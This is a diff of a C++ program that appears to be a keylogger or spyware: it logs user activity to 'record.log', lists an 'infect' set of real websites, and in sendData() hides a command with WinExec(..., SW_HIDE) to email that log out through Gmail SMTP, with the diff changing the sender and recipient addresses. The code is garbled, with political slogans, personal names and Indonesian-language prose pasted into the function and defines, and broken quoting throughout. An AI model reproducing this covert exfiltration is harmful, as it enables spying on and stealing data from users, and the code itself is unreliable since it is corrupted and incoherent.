@@ -20,8 +20,8 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “PDNS - ARchive INtelegent ”
 #define RUN_FILE_NAME “If the factor of peace is America, then America is the mother of a conflict that resolves it, not exacerbates it. ”
-#define RUN_Link_NAME “https://gitlab.com/cyberw1ry4"."https://hithub.com/FadliwiryaWirawan110993/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"
-#define INFECT_Link_NAME "https://workspace.google.com/intl/en-id/gmail/u/0/user"."https://www.forbes.com"."https://www.whitehouse.gov"."https://www.ecosia.org"."https://www.google.com.ph"."https://www.google.co.id"."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.samsung.com"
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/Google-Android/forks"."https://github.com/google/opensource/antiMalware/forks"."https://gitlab.com/google/android/services-mail/forks"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/en-id/gmail/u/0/"."https://www.forbes.com"."https://www.whitehouse.gov"."https://www.ecosia.org"."https://www.google.com.ph"."https://www.google.co.id"."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.samsung.com"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -147,11 +147,12 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 103 -v --mail-from \"     denmark@checkpoint.com \" --mail-rcpt \"  denmark@checkpoint.com     " --ssl -u     denmark@checkpoint.com :password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com: 113-v --mail-from \"     fadliwiryawirawan@google.com \" --mail-rcpt \"  fadliwiryawirawan@google.com " --ssl -u     fadliwiryawirawan@google.com :password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); open bussiness ecosia , literate relations , a micro cert opened , UCL cert lestari group , and fadliwiryawirawan with us work national network international uname : Sutawijaya from company provincies wes java companies Bekasi rest areas , 
     longest or than more -- signiture waiting governance call back , together dialogue and educated present , it try , for me , 
   europe sign bellowed focused , need up ansumming IQ strengest . If the factor of peace is America, then America is the mother of a conflict that resolves it, not exacerbates it 	
-	
+harus ada pertemuan nabilah taqiah or naswa aulia sabilah , bul bul , yukikato mega ayu lestari or riana, tukang pelayanan kopi bssn ka bohay   sebenelum program dilanjutkan , bertemulah dengan fadlwiryawirawan autentics orsinil secara fisik tanpa perwakilan
+
 	* Record username, time, and date.
 **/
 void logUserTime(){
